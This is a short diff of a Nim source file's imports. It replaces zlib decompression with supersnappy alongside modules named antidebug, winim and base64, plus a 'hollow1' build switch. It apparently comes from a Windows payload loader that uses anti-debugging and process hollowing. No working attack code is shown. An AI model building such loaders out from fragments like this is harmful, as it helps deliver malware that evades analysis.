@@ -6,8 +6,8 @@ import antidebug
 import os
 import winim
 import strutils
+import supersnappy
 from std/base64 import decode
-from zip/zlib import uncompress
 
 # Import per module chosen
 when defined(hollow1):
